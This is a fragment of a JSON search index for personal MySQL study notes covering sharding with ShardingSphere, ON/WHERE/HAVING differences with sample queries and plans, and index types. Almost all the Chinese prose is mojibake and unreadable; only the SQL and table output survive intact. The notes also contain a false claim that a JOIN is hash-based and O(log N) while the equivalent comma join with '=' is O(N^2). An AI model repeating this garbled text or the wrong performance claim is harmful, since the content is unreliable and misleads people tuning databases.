æ•°æ®çš„è¿ç§»ï¼Œå®¹é‡å¦‚ä½•è§„åˆ’ï¼Œæœªæ¥æ˜¯å¦å¯èƒ½å†æ¬¡éœ€è¦æ‰©å®¹ï¼Œç­‰ç­‰ï¼Œéƒ½æ˜¯éœ€è¦è€ƒè™‘çš„é—®é¢˜ã€‚ ID é—®é¢˜ æ•°æ®åº“è¡¨è¢«åˆ‡åˆ†åï¼Œä¸èƒ½å†ä¾èµ–æ•°æ®åº“è‡ªèº«çš„ä¸»é”®è‡ªå¢ç”Ÿæˆæœºåˆ¶ï¼Œæ‰€ä»¥éœ€è¦ä¸€äº›æ‰‹æ®µæ¥ä¿è¯å…¨å±€ä¸»é”®å”¯ä¸€ã€‚ å³ æ¡ˆä¾‹-ä¸»é”®å†²çª è¿˜æ˜¯è‡ªå¢ï¼Œåªä¸è¿‡è‡ªå¢æ­¥é•¿è®¾ç½®ä¸€ä¸‹ã€‚æ¯”å¦‚ç°åœ¨æœ‰ä¸‰å¼ è¡¨ï¼Œæ­¥é•¿è®¾ç½®ä¸º3ï¼Œ ä¸‰å¼ è¡¨ID åˆå§‹å€¼åˆ†åˆ«æ˜¯1ã€2ã€3ã€‚ è¿™æ ·ç¬¬ä¸€å¼ è¡¨çš„IDå¢é•¿æ˜¯1ã€4ã€7ã€‚ç¬¬äºŒå¼ è¡¨æ˜¯2ã€5ã€8ã€‚ç¬¬ä¸‰å¼ è¡¨æ˜¯3ã€6ã€9ï¼Œè¿™æ ·å°±ä¸ä¼šé‡å¤äº†ã€‚ UUIDï¼Œè¿™ç§æœ€ç®€å•ï¼Œä½†æ˜¯ä¸è¿ç»­çš„ä¸»é”®æ’å…¥ä¼šå¯¼è‡´ä¸¥é‡çš„é¡µåˆ†è£‚ï¼Œæ€§èƒ½æ¯”è¾ƒå·®ã€‚ åˆ†å¸ƒå¼IDï¼Œæ¯”è¾ƒå‡ºåçš„å°±æ˜¯ Twitter å¼€æºçš„ sonwflake é›ªèŠ±ç®—æ³• æ¡ˆä¾‹-ä¸»é”®å†²çª æ•°æ®åº“ä¸€èˆ¬ä½¿ç”¨æ•´å‹è‡ªå¢ä¸»é”®, é‚£ä¹ˆå½“è¿›è¡Œåˆ†åº“åˆ†è¡¨æ—¶, æ–°çš„è¡¨ä¹Ÿæ˜¯éœ€è¦ä¸»é”®ç´¢å¼•çš„, è¿™ä¸ªæ—¶å€™å°±ä¼šæœ‰ä¸»é”®å†²çª, å¦‚ä½•è§£å†³? æœ‰ä¸ªè‡ªå®šä¹‰ä¸»é”®, é›ªèŠ± ç®—æ³•, å®ƒè®©ä¸»é”®åªæ˜¯ä¿æŒä¸€ä¸ªå¢åŠ çš„è¶‹åŠ¿, å…·ä½“æ€ä¹ˆå®ç°çš„, åé¢å†ç ”ç©¶. æ¡ˆä¾‹-å¤šæ•°æ®æº, åˆ†å¸ƒå¼äº‹åŠ¡é—®é¢˜ åˆ†åº“åˆ†è¡¨å¼€æºæ¡†æ¶ ShardingSphereåˆ†åº“åˆ†è¡¨ äº¬ä¸œå¼€æº åœ°å€: Apache ShardingSphere æ”¯æŒ: ShardingJDBC: å®¢æˆ·ç«¯åˆ†åº“åˆ†è¡¨ ShardingProxy: æœåŠ¡ç«¯åˆ†åº“åˆ†è¡¨ å®é™…ä½¿ç”¨æ–¹é¢æ¥çœ‹, å®ç°æ˜¯é€šè¿‡é…ç½®æŠŠå¤šä¸ªè¡¨ã€åº“æ•´åˆä¸ºä¸€ä¸ªé€»è¾‘è¡¨ã€åº“ æ”¯æŒç­–ç•¥ Inlineç­–ç•¥ - æ ¹æ®å•ä¸€åˆ†ç‰‡é”®è¿›è¡Œç²¾ç¡®åˆ†ç‰‡; å¦‚ SQL: Insert into course values (?,?,?,?) Select * from course where cid = ? Select * from course where cid in ? æ³¨: æ­¤å¤„cidæ˜¯ç”±é›ªèŠ±ç®—æ³•ç”Ÿæˆçš„ä¸»é”®id åˆ†ç‰‡é”®: cidå°½é‡ä¸è¦ç”¨idï¼ŒMyBatisä¼šå¯¹idå­—æ®µé»˜è®¤ç”Ÿæˆé›ªèŠ±ä¸»é”® åˆ†ç‰‡ç®—æ³•: m$->{cid%2+1}.course_$-> I ((cid+1) %4).intdiv(2) +1} çœŸå®èŠ‚ç‚¹: m$->{1.. 2}.course_$->{1.. 2} Standardç­–ç•¥ - æ ¹æ®å•ä¸€åˆ†ç‰‡é”®è¿›è¡Œç²¾ç¡®æˆ–è€…èŒƒå›´åˆ†ç‰‡; å¦‚SQL: Select * from course where cid between ? and ? åˆ†ç‰‡é”®: cid åˆ†ç‰‡ç®—æ³•: Precise algorithm + Range algorithm çœŸå®èŠ‚ç‚¹: m$->{1.. 2}.course_$->{1.. 2} Complexç­–ç•¥ - æ ¹æ®å¤šä¸ªåˆ†ç‰‡é”®è¿›è¡Œç²¾ç¡®æˆ–è€…èŒƒå›´åˆ†ç‰‡; Hintç­–ç•¥ - ä½¿ç”¨ä¸SQLæ— å…³çš„æ–¹å¼è¿›è¡Œåˆ†ç‰‡; å¦‚æŸ¥è¯¢çš„cidæ˜¯å¥‡æ•° å…¶ä»–: æ”¯æŒè¯»å†™åˆ†ç¦»ä¸‹çš„ç­–ç•¥é…ç½® æ¡ˆä¾‹ä¸¾ä¾‹ æ¡ˆä¾‹-ä¸åŒç”¨æˆ·ç«¯ä¼˜åŒ– è¯´æ˜: ä¸»è¦æ˜¯è¿è¥ç®¡ç†ç«¯, å¦‚æœéœ€è¦å®æ—¶å¯ä»¥ç”¨es, esä¸­å¯ä»¥åªå­˜ç›¸å…³å…³é”®æŸ¥è¯¢å­—æ®µå’Œä¸»é”® ç„¶åå†æ‹¿ä¸»é”®å»æ•°æ®åº“æ‹¿. æ¡ˆä¾‹-çº¿ä¸Šå•åº“ä¸åœæœºè¿ç§» å…ˆè€ƒè™‘åœæœºè¿ç§», å¯ä»¥ç›´æ¥æ•´åº“è¿ç§», æˆ–è€…æ¯æ¬¡è¿ç§»1kæ•°æ®ç­‰ ä½†æ˜¯å¦‚æœæ˜¯çº¿ä¸Šè¿ç§», æœŸé—´å¯èƒ½ä¼šæœ‰ä¸šåŠ¡æ•°æ®æ›´æ–°. æ–¹æ¡ˆä¸€: ç›‘å¬binlog binlogè®°å½•äº†å¯¹æ•°æ®åº“çš„ä¿®æ”¹, é˜¿é‡Œæœ‰ä¸ªå¼€æºçš„ canal ç»„ä»¶ , å¯ä»¥åšåˆ°ç›‘å¬binlog ç„¶åæŠŠbinlogçš„å˜åŠ¨è§£æå‡ºæ¥å†™åˆ°æ–°åº“è¡¨. ä½†æ˜¯å¾—è€ƒè™‘, å¦‚æœç›‘å¬binlogå†™åˆ°æ–°åº“è¡¨è¦æ¯”è¿ç§»çš„å¿«, å°±ä¼šé€ æˆæ•°æ®æ··ä¹±. è§£å†³æ–¹æ¡ˆå°±æ˜¯ç”¨ç‰ˆæœ¬å•Š, é‡è¯•æœºåˆ¶å•¥çš„ è¿ç§»åä¹Ÿä¸èƒ½é©¬ä¸Šå…¨éƒ¨æ‹¿å»ç”¨, è€Œæ˜¯ ç°åº¦å‘å¸ƒ , å…ˆç»™éƒ¨åˆ†æœåŠ¡å™¨ç”¨. ç°åº¦çš„å‘¨æœŸä¸€èˆ¬æ¯”è¾ƒçŸ­, å› ä¸ºæœŸé—´å¯èƒ½æœ‰åˆ†æµçš„é—®é¢˜, æ¯”å¦‚æ›´æ–°çš„æ–°è¡¨, ä½†æ˜¯æœ‰æŸ¥è¯¢æ—§è¡¨...","tags":"æ•°æ®åº“","url":"/yq-doc-source-docs-database-mysql-Sub--meter.html","loc":"/yq-doc-source-docs-database-mysql-Sub--meter.html"},{"title":"onã€whereã€Havingçš„åŒºåˆ«","text":"æ³¨è§£ è¿æ¥æŸ¥è¯¢å‚è€ƒ: /docs/æ•°æ®åº“/mysql/è¡¨å†…å¤–è¿æ¥ WHEREä¸HAVING WHEREå­å¥åœ¨GROUP BYåˆ†ç»„å’Œèšåˆå‡½æ•°ä¹‹å‰å¯¹æ•°æ®è¡Œè¿›è¡Œè¿‡æ»¤ï¼› HAVINGå­å¥å¯¹GROUP BYåˆ†ç»„å’Œèšåˆå‡½æ•°ä¹‹åçš„æ•°æ®è¡Œè¿›è¡Œè¿‡æ»¤ã€‚ å› æ­¤ï¼ŒWHEREå­å¥ä¸­ä¸èƒ½ä½¿ç”¨èšåˆå‡½æ•°ã€‚ä¾‹å¦‚ï¼Œä»¥ä¸‹è¯­å¥å°†ä¼šè¿”å›é”™è¯¯: -- æŸ¥æ‰¾äººæ•°å¤§äº 5 çš„éƒ¨é—¨ select dept_id, count(*) from employee where count(*) > 5 group by dept_id; å› ä¸ºåœ¨æ‰§è¡ŒWHEREå­å¥æ—¶ï¼Œè¿˜æ²¡æœ‰è®¡ç®—count å¦ä¸€æ–¹é¢ï¼ŒHAVINGå­å¥ä¸­ä¸èƒ½ä½¿ç”¨é™¤äº†åˆ†ç»„å­—æ®µå’Œèšåˆå‡½æ•°ä¹‹å¤–çš„å…¶ä»–å­—æ®µã€‚ä¾‹å¦‚ï¼Œä»¥ä¸‹è¯­å¥å°†ä¼šè¿”å›é”™è¯¯: -- ç»Ÿè®¡æ¯ä¸ªéƒ¨é—¨æœˆè–ªå¤§äºç­‰äº 30000 çš„å‘˜å·¥äººæ•° select dept_id, count(*) from employee group by dept_id having salary >= 30000; å› ä¸ºç»è¿‡GROUP BYåˆ†ç»„å’Œèšåˆå‡½æ•°ä¹‹åï¼Œä¸å†å­˜åœ¨ salary å­—æ®µï¼ŒHAVINGå­å¥ä¸­åªèƒ½ä½¿ç”¨åˆ†ç»„å­—æ®µæˆ–è€…èšåˆå‡½æ•° ä»æ€§èƒ½çš„è§’åº¦æ¥è¯´ï¼ŒHAVINGå­å¥ä¸­å¦‚æœä½¿ç”¨äº† åˆ†ç»„å­—æ®µ ä½œä¸ºè¿‡æ»¤æ¡ä»¶ï¼Œåº”è¯¥æ›¿æ¢æˆWHEREå­å¥ï¼› å› ä¸ºWHEREå¯ä»¥åœ¨æ‰§è¡Œåˆ†ç»„æ“ä½œå’Œè®¡ç®—èšåˆå‡½æ•°ä¹‹å‰è¿‡æ»¤æ‰ä¸éœ€è¦çš„æ•°æ®ï¼Œæ€§èƒ½ä¼šæ›´å¥½ã€‚ ä¸‹é¢ç¤ºä¾‹ä¸­çš„è¯­å¥ 1 åº”è¯¥æ›¿æ¢æˆè¯­å¥ 2: -- è¯­å¥ 1 select dept_id, count(*) from employee group by dept_id having dept_id = 1; -- è¯­å¥ 2 select dept_id, count(*) from employee where dept_id = 1 group by dept_id; å½“ç„¶ï¼ŒWHEREå’ŒHAVINGå¯ä»¥ç»„åˆåœ¨ä¸€èµ·ä½¿ç”¨ã€‚ä¾‹å¦‚: select dept_id, count(*) from employee where salary > 10000 group by dept_id having count(*) > 1; dept_id|count(*)| -------|--------| 1| 3| è¯¥è¯­å¥è¿”å›äº†æœˆè–ªå¤§äº 10000 çš„å‘˜å·¥äººæ•°å¤§äº 1 çš„éƒ¨é—¨ï¼› WHEREç”¨äºè¿‡æ»¤æœˆè–ªå¤§äº 10000 çš„å‘˜å·¥ï¼›HAVINGç”¨äºè¿‡æ»¤å‘˜å·¥æ•°é‡å¤§äº 1 çš„éƒ¨é—¨ã€‚ WHERE ä¸ ON å½“æŸ¥è¯¢æ¶‰åŠå¤šä¸ªè¡¨çš„å…³è”æ—¶ï¼Œæˆ‘ä»¬æ—¢å¯ä»¥ä½¿ç”¨WHEREå­å¥ä¹Ÿå¯ä»¥ä½¿ç”¨ONå­å¥æŒ‡å®šè¿æ¥æ¡ä»¶å’Œè¿‡æ»¤æ¡ä»¶ã€‚è¿™ä¸¤è€…ä¹‹é—´çš„ä¸»è¦åŒºåˆ«åœ¨äºï¼š å¯¹äºå†…è¿æ¥ï¼ˆinner joinï¼‰æŸ¥è¯¢ï¼ŒWHEREå’ŒONä¸­çš„è¿‡æ»¤æ¡ä»¶ç­‰æ•ˆï¼› å¯¹äºå¤–è¿æ¥ï¼ˆouter joinï¼‰æŸ¥è¯¢ï¼ŒONä¸­çš„è¿‡æ»¤æ¡ä»¶åœ¨è¿æ¥æ“ä½œä¹‹å‰æ‰§è¡Œï¼Œ WHEREä¸­çš„è¿‡æ»¤æ¡ä»¶ï¼ˆé€»è¾‘ä¸Šï¼‰åœ¨è¿æ¥æ“ä½œä¹‹åæ‰§è¡Œã€‚ æ¡ä»¶æŸ¥è¯¢å†…è¿æ¥ å¯¹äºå†…è¿æ¥æŸ¥è¯¢è€Œè¨€ï¼Œä»¥ä¸‹ä¸‰ä¸ªè¯­å¥çš„ç»“æœç›¸åŒ: -- è¯­å¥ 1 select d.dept_name, e.emp_name, e.sex, e.salary from employee e, department d where e.dept_id = d.dept_id and e.emp_id = 10; dept_name|emp_name|sex|salary | ---------|--------|---|-------| ç ”å‘éƒ¨ |å»–åŒ– |ç”· |6500.00| -- è¯­å¥ 2 select d.dept_name, e.emp_name, e.sex, e.salary from employee e join department d on (e.dept_id = d.dept_id and e.emp_id = 10); dept_name|emp_name|sex|salary | ---------|--------|---|-------| ç ”å‘éƒ¨ |å»–åŒ– |ç”· |6500.00| -- è¯­å¥ 3 select d.dept_name, e.emp_name, e.sex, e.salary from employee e join department d on (e.dept_id = d.dept_id) where e.emp_id = 10; dept_name|emp_name|sex|salary | ---------|--------|---|-------| ç ”å‘éƒ¨ |å»–åŒ– |ç”· |6500.00| è¯­å¥ 1 åœ¨WHEREä¸­æŒ‡å®šè¿æ¥æ¡ä»¶å’Œè¿‡æ»¤æ¡ä»¶ï¼›è¯­å¥ 2 åœ¨ONä¸­æŒ‡å®šè¿æ¥æ¡ä»¶å’Œè¿‡æ»¤æ¡ä»¶ï¼› è¯­å¥ 3 åœ¨ONä¸­æŒ‡å®šè¿æ¥æ¡ä»¶ï¼Œåœ¨WHEREä¸­æŒ‡å®šå…¶ä»–è¿‡æ»¤æ¡ä»¶ã€‚ ä¸Šé¢è¯­å¥ä¸ä½†ç»“æœç›¸åŒï¼Œæ•°æ®åº“çš„æ‰§è¡Œè®¡åˆ’ä¹Ÿç›¸åŒã€‚ä»¥ MySQL ä¸ºä¾‹ï¼Œä»¥ä¸Šè¯­å¥çš„æ‰§è¡Œè®¡åˆ’å¦‚ä¸‹: id|select_type|table|partitions|type |possible_keys |key |key_len|ref |rows|filtered|Extra| --|-----------|-----|----------|-----|--------------------|-------|-------|-----|----|--------|-----| 1|SIMPLE |e | |const|PRIMARY,idx_emp_dept|PRIMARY|4 |const| 1| 100| | 1|SIMPLE |d | |const|PRIMARY |PRIMARY|4 |const| 1| 100| | å°½ç®¡å¦‚æ­¤ï¼Œä»ç„¶å»ºè®®å°†ä¸¤ä¸ªè¡¨çš„è¿æ¥æ¡ä»¶æ”¾åœ¨ONå­å¥ä¸­ï¼Œå°†å…¶ä»–è¿‡æ»¤æ¡ä»¶æ”¾åœ¨WHEREå­å¥ä¸­ï¼› è¿™æ ·è¯­ä¹‰æ›´åŠ æ˜ç¡®ï¼Œæ›´å®¹æ˜“é˜…è¯»å’Œç†è§£ã€‚å¯¹äºä¸Šé¢çš„ç¤ºä¾‹è€Œè¨€ï¼Œæ¨èä½¿ç”¨è¯­å¥ 3 çš„å†™æ³•ã€‚ æ¡ä»¶æŸ¥è¯¢å¤–è¿æ¥ å¯¹äºå¤–è¿æ¥è€Œè¨€ï¼Œè¿æ¥æ¡ä»¶åªèƒ½ç”¨ONå­å¥è¡¨ç¤ºï¼Œå› ä¸ºWHEREå­å¥æ— æ³•è¡¨ç¤ºå¤–è¿æ¥çš„è¯­ä¹‰ã€‚ä¾‹å¦‚: select d.dept_name, e.emp_name, e.sex, e.salary from department d left join employee e on (e.dept_id = d.dept_id) where d.dept_name = 'ä¿å«éƒ¨'; dept_name|emp_name|sex|salary| ---------|--------|---|------| ä¿å«éƒ¨ | | | | ç”±äº\"ä¿å«éƒ¨\"æ²¡æœ‰å‘˜å·¥ï¼Œæˆ‘ä»¬éœ€è¦ä½¿ç”¨å¤–è¿æ¥è¿”å›éƒ¨é—¨çš„ä¿¡æ¯ï¼› WHEREæ¡ä»¶ç”¨äºè¿‡æ»¤ dept_id = 6 çš„æ•°æ®ï¼›æ­¤æ—¶ï¼Œå‘˜å·¥è¡¨ä¸­è¿”å›çš„éƒ½æ˜¯ NULLã€‚ æ³¨è§£ Oracle æ”¯æŒåœ¨WHEREå­å¥çš„å³/å·¦ä¾§ä½¿ç”¨ (+) è¡¨ç¤ºå·¦/å³å¤–è¿æ¥ï¼Œä½†æ˜¯æ— æ³•è¡¨ç¤ºå…¨å¤–è¿æ¥ã€‚ å¯¹äºä»¥ä¸Šè¯­å¥ï¼Œå¦‚æœå°†WHEREå­å¥ä¸­çš„è¿‡æ»¤æ¡ä»¶æ”¾åˆ°ONå­å¥ä¸­ï¼Œç»“æœå°†ä¼šå®Œå…¨ä¸åŒ: select d.dept_name, e.emp_name, e.sex, e.salary from department d left join employee e on (e.dept_id = d.dept_id and d.dept_name = 'ä¿å«éƒ¨'); dept_name|emp_name|sex|salary| ---------|--------|---|------| è¡Œæ”¿ç®¡ç†éƒ¨| | | | äººåŠ›èµ„æºéƒ¨| | | | è´¢åŠ¡éƒ¨ | | | | ç ”å‘éƒ¨ | | | | é”€å”®éƒ¨ | | | | ä¿å«éƒ¨ | | | | å·¦å¤–è¿æ¥è¿”å›äº†æ‰€æœ‰çš„éƒ¨é—¨ä¿¡æ¯ï¼Œè€Œä¸”å‘˜å·¥ä¿¡æ¯éƒ½ä¸º NULLï¼› æ˜¾ç„¶ï¼Œè¿™ä¸æ˜¯æˆ‘ä»¬æœŸæœ›çš„ç»“æœã€‚æˆ‘ä»¬å¯ä»¥é€šè¿‡æ‰§è¡Œè®¡åˆ’åˆ†æä¸€ä¸‹ä¸ºä»€ä¹ˆä¼šè¿™æ ·ï¼Œ ä»ç„¶ä»¥ MySQL ä¸ºä¾‹: explain analyze select d.dept_name, e.emp_name, e.sex, e.salary from department d left join employee e on (e.dept_id = d.dept_id and d.dept_name = 'ä¿å«éƒ¨'); -> Nested loop left join (cost=7.60 rows=30) (actual time=0.098..0.278 rows=6 loops=1) -> Table scan on d (cost=0.85 rows=6) (actual time=0.052..0.057 rows=6 loops=1) -> Filter: (d.dept_name = 'ä¿å«éƒ¨') (cost=0.71 rows=5) (actual time=0.035..0.035 rows=0 loops=6) -> Index lookup on e using idx_emp_dept (dept_id=d.dept_id) (cost=0.71 rows=5) (actual time=0.020..0.032 rows=4 loops=6) æŸ¥è¯¢è®¡åˆ’æ˜¾ç¤ºä½¿ç”¨ Nested loop left join æ–¹å¼æ‰§è¡Œè¿æ¥æ“ä½œï¼› å¯¹äº department ä½¿ç”¨å…¨è¡¨æ‰«æçš„æ–¹å¼è¿”å› 6 è¡Œè®°å½•ï¼› å¯¹äº employee è¡¨é‡‡ç”¨ç´¢å¼•ï¼ˆidx_emp_deptï¼‰æŸ¥æ‰¾ï¼Œ åŒæ—¶ä½¿ç”¨\"d.dept_name = 'ä¿å«éƒ¨'\"ä½œä¸ºè¿‡æ»¤æ¡ä»¶ï¼Œå¾ªç¯ 6 æ¬¡è¿”å›äº† 0 è¡Œè®°å½•ï¼› æœ€ç»ˆè¿”å›äº†ä¸Šé¢çš„ç»“æœã€‚ ä½œä¸ºå¯¹æ¯”ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹çœ‹å°†è¿‡æ»¤æ¡ä»¶æ”¾åˆ°WHEREå­å¥æ—¶çš„æ‰§è¡Œè®¡åˆ’: explain analyze select d.dept_name, e.emp_name, e.sex, e.salary from department d left join employee e on (e.dept_id = d.dept_id) where d.dept_name = 'ä¿å«éƒ¨'; -> Nested loop left join (cost=1.98 rows=5) (actual time=0.074..0.078 rows=1 loops=1) -> Filter: (d.dept_name = 'ä¿å«éƒ¨') (cost=0.85 rows=1) (actual time=0.049..0.053 rows=1 loops=1) -> Table scan on d (cost=0.85 rows=6) (actual time=0.039..0.047 rows=6 loops=1) -> Index lookup on e using idx_emp_dept (dept_id=d.dept_id) (cost=1.12 rows=5) (actual time=0.021..0.021 rows=0 loops=1) æŸ¥è¯¢è®¡åˆ’æ˜¾ç¤ºä½¿ç”¨ Nested loop left join æ–¹å¼æ‰§è¡Œè¿æ¥æ“ä½œï¼› å¯¹äº department é€šè¿‡æ‰«æè¿”å› 1 è¡Œè®°å½•ï¼ˆd.dept_name = 'ä¿å«éƒ¨'ï¼‰ï¼› å¯¹äº employee è¡¨é‡‡ç”¨ç´¢å¼•ï¼ˆidx_emp_deptï¼‰æŸ¥æ‰¾ï¼Œ åŒæ—¶ä½¿ç”¨ dept_id=d.dept_id ä½œä¸ºè¿‡æ»¤æ¡ä»¶ï¼Œå¾ªç¯ 1 æ¬¡è¿”å›äº† 0 è¡Œè®°å½•ã€‚ æ³¨è§£ ä¸€èˆ¬æ¥è¯´ï¼Œå¯¹äºå·¦å¤–è¿æ¥æŸ¥è¯¢ï¼Œå·¦è¡¨çš„è¿‡æ»¤åº”è¯¥ä½¿ç”¨WHEREå­å¥ï¼Œ å³è¡¨çš„è¿‡æ»¤åº”è¯¥ä½¿ç”¨ONå­å¥ï¼›å³å¤–è¿æ¥æŸ¥è¯¢æ­£å¥½ç›¸åï¼›å…¨å¤–è¿æ¥çš„è¿‡æ»¤æ¡ä»¶ä½¿ç”¨ONå­å¥ã€‚ åœ¨ä½¿ç”¨jionæ—¶ï¼Œonå’Œwhereæ¡ä»¶çš„åŒºåˆ«å¦‚ä¸‹ï¼š on æ¡ä»¶æ˜¯åœ¨ç”Ÿæˆä¸´æ—¶è¡¨æ—¶ä½¿ç”¨çš„æ¡ä»¶ï¼Œè¿”å›onæ¡ä»¶åŒ¹é…çš„è®°å½•ã€‚ where æ¡ä»¶æ˜¯åœ¨ä¸´æ—¶è¡¨ç”Ÿæˆå¥½åï¼Œå†å¯¹ä¸´æ—¶è¡¨è¿›è¡Œè¿‡æ»¤çš„æ¡ä»¶ã€‚ è¿™æ—¶å·²ç»æ²¡æœ‰left joinçš„å«ä¹‰ï¼ˆå¿…é¡»è¿”å›å·¦è¾¹è¡¨çš„è®°å½•ï¼‰äº†ï¼Œæ¡ä»¶ä¸ä¸ºçœŸçš„å°±å…¨éƒ¨è¿‡æ»¤æ‰ã€‚ onã€whereã€havingè¿™ä¸‰ä¸ªéƒ½å¯ä»¥åŠ åœ¨æ¡ä»¶çš„å­å¥ä¸­ï¼Œonæ˜¯æœ€å…ˆæ‰§è¡Œï¼Œwhereæ¬¡ä¹‹ï¼Œhavingæœ€åã€‚ å¯¹äºå†…è¿æ¥ï¼Œinner joinï¼ˆinner joinå³joinï¼‰å’Œ = ç­‰å·ç»“æœä¸€æ ·ï¼Œä½†å®ç°åŸç†å®Œå…¨ä¸åŒï¼Œ joinæ˜¯åŸºäºhashtableè¿æ¥æ¯”è¾ƒï¼Œ è€Œ=ç›´æ¥å°±æ˜¯å–ç¬›å¡å°”é›†å†è¿‡æ»¤ï¼Œæ‰€ä»¥åè€…æ•ˆç‡ä½ï¼Œæ˜¯O(N&#94;2)ï¼Œå‰è€…æ˜¯O(LogN)ã€‚ æ³¨è§£ ç¬›å¡å°”é›†, å°±æ˜¯ä¸€ä¸ªè¡¨çš„æ‰€æœ‰è¡Œè·Ÿå¦ä¸€ä¸ªè¡¨çš„æ‰€æœ‰è¡Œå…¨è¿æ¥ å‚è€ƒ: ã€MySQLã€‘è¿æ¥æŸ¥è¯¢ ä»¥åŠ onã€whereã€Havingçš„åŒºåˆ«","tags":"æ•°æ®åº“","url":"/yq-doc-source-docs-database-mysql-The-difference-between-on,-where,-having.html","loc":"/yq-doc-source-docs-database-mysql-The-difference-between-on,-where,-having.html"},{"title":"ç´¢å¼•","text":"æ•°æ®ç»“æ„å®ç° è§: /docs/æ•°æ®åº“/mysql/ç´¢å¼•æ•°æ®ç»“æ„ ç´¢å¼•åˆ†ç±» æ•°æ®ç»“æ„è§’åº¦ B+ Hash FULL TEXT ç‰©ç†å­˜å‚¨è§’åº¦ èšç°‡ç´¢å¼• éèšç°‡ç´¢å¼• é€»è¾‘è§’åº¦ ä¸»é”®ç´¢å¼•(Primary Key): ä¹Ÿå« èšé›†ç´¢å¼•, èšç°‡ç´¢å¼•, æ˜¯ç‰¹æ®Šçš„å”¯ä¸€ç´¢å¼•, ä¸å…è®¸ç©º; InnoDBå­˜å‚¨å¼•æ“çš„è¡¨ä¼šå­˜åœ¨ä¸»é”®ï¼ˆå”¯ä¸€énullï¼‰ï¼Œå¦‚æœå»ºè¡¨çš„æ—¶å€™æ²¡æœ‰æŒ‡å®šä¸»é”®ï¼Œ åˆ™ä¼šä½¿ç”¨ç¬¬ä¸€éç©ºçš„å”¯ä¸€ç´¢å¼•ä½œä¸ºèšé›†ç´¢å¼•ï¼Œ å¦åˆ™InnoDBä¼šè‡ªåŠ¨å¸®ä½ åˆ›å»ºä¸€ä¸ªä¸å¯è§çš„ã€é•¿åº¦ä¸º6å­—èŠ‚çš„row_idç”¨æ¥ä½œä¸ºèšé›†ç´¢å¼•ã€‚ å”¯ä¸€ç´¢å¼•(Unique): ç´¢å¼•åˆ—å€¼æƒŸä¸€, å…è®¸ç©º; ç´¢å¼•åˆ—çš„å€¼å¿…é¡»å”¯ä¸€ï¼Œä½†å…è®¸æœ‰ç©ºå€¼; å•åˆ—ç´¢å¼•(Key): ä¹Ÿå«æ™®é€šç´¢å¼•, ä¸€ä¸ªç´¢å¼•åªåŒ…å«å•ä¸ªåˆ—; æ˜¯MySQLä¸­çš„åŸºæœ¬ç´¢å¼•ç±»å‹ï¼Œå…è®¸åœ¨å®šä¹‰ç´¢å¼•çš„åˆ—ä¸­æ’å…¥é‡å¤å€¼å’Œç©ºå€¼; å¤šåˆ—ç´¢å¼•: ä¹Ÿå«ç»„åˆç´¢å¼•; ç»„åˆç´¢å¼•æŒ‡åœ¨è¡¨çš„å¤šä¸ªå­—æ®µç»„åˆä¸Šåˆ›å»ºçš„ç´¢å¼•ï¼Œ åˆ—å€¼çš„ç»„åˆå¿…é¡»å”¯ä¸€, åªæœ‰åœ¨æŸ¥è¯¢æ¡ä»¶ä¸­ä½¿ç”¨äº†è¿™äº›å­—æ®µçš„å·¦è¾¹å­—æ®µæ—¶ï¼Œ ç´¢å¼•æ‰ä¼šè¢«ä½¿ç”¨ã€‚ä½¿ç”¨ç»„åˆç´¢å¼•æ—¶ éµå¾ªæœ€å·¦å‰ç¼€é›†åˆ ; å…¨æ–‡ç´¢å¼•(FULLTEXT): å…¨æ–‡ç´¢å¼•ç±»å‹ä¸ºFULLTEXTï¼Œåœ¨å®šä¹‰ç´¢å¼•çš„åˆ—ä¸Šæ”¯æŒå€¼çš„å…¨æ–‡æŸ¥æ‰¾ï¼Œ å…è®¸åœ¨è¿™äº›ç´¢å¼•åˆ—ä¸­æ’å…¥é‡å¤å€¼å’Œç©ºå€¼ã€‚å…¨æ–‡ç´¢å¼•å¯ä»¥åœ¨CHARã€VARCHARæˆ–è€…TEXTç±»å‹çš„åˆ—ä¸Šåˆ›å»º æ³¨æ„æœç´¢é•¿åº¦æœ‰é»˜è®¤å€¼ï¼Œå‚è€ƒ: MySQL ä¹‹å…¨æ–‡ç´¢å¼• ç©ºé—´ç´¢å¼•(SPATIAL): ç©ºé—´ç´¢å¼•æ˜¯å¯¹ç©ºé—´æ•°æ®ç±»å‹çš„å­—æ®µå»ºç«‹çš„ç´¢å¼•ï¼Œ MySQLä¸­çš„ç©ºé—´æ•°æ®ç±»å‹æœ‰4ç§ï¼Œåˆ†åˆ«æ˜¯GEOMETRYã€POINTã€LINESTRINGå’ŒPOLYGONã€‚ MySQLä½¿ç”¨SPATIALå…³é”®å­—è¿›è¡Œæ‰©å±•ï¼Œä½¿å¾—èƒ½å¤Ÿç”¨äºåˆ›å»ºæ­£è§„ç´¢å¼•ç±»ä¼¼çš„è¯­æ³•åˆ›å»ºç©ºé—´ç´¢å¼•ã€‚ åˆ›å»ºç©ºé—´ç´¢å¼•çš„åˆ—å¿…é¡»å£°æ˜ä¸ºNOT NULL æ³¨è§£ éµå¾ªæœ€å·¦å‰ç¼€é›†åˆ order byä½¿ç”¨ç´¢å¼•æœ€å·¦å‰ç¼€: order by a order by a,b order by a,b,c order by a desc, b desc, c desc å¦‚æœwhereä½¿ç”¨ç´¢å¼•çš„æœ€å·¦å‰ç¼€å®šä¹‰ä¸ºå¸¸é‡ï¼Œåˆ™order byèƒ½ä½¿ç”¨ç´¢å¼•: where a=const order by b,c where a=const and b=const order by c where a=const and b > const order by b,c ä¸èƒ½ä½¿ç”¨ç´¢å¼•è¿›è¡Œæ’åº: order by a , b desc ,c desc --æ’åºä¸ä¸€è‡´ where d=const order by b,c --aä¸¢å¤± where a=const order by c --bä¸¢å¤± where a=const order by b,d --dä¸æ˜¯ç´¢å¼•çš„ä¸€éƒ¨åˆ† where a in(...) order by b,c --aå±äºèŒƒå›´æŸ¥è¯¢ è¯´æ˜, å½“åˆ›å»ºä¸€ä¸ªç®€å•çš„è¡¨: CREATE TABLE my_test ( `id` int(11) NOT NULL AUTO_INCREMENT, `username` varchar(50) DEFAULT NULL, `sex` varchar(5) DEFAULT NULL, `address` varchar(100) DEFAULT NULL, `birthday` datetime NOT NULL, `user_num` int(11) unique, PRIMARY KEY (`id`), index(username) ); ä¼šå‘ç°æ˜æ˜åœ¨å»ºè¡¨çš„æ—¶å€™åªåˆ›å»ºäº†ä¸€ä¸ªç´¢å¼•ï¼ŒæŸ¥è¯¢å‡ºæ¥çš„æœ‰ä¸‰ä¸ª: show index from my_test; å…¶å® ä¸»é”®ï¼Œå”¯ä¸€çº¦æŸåˆ—ï¼Œå¤–é”® 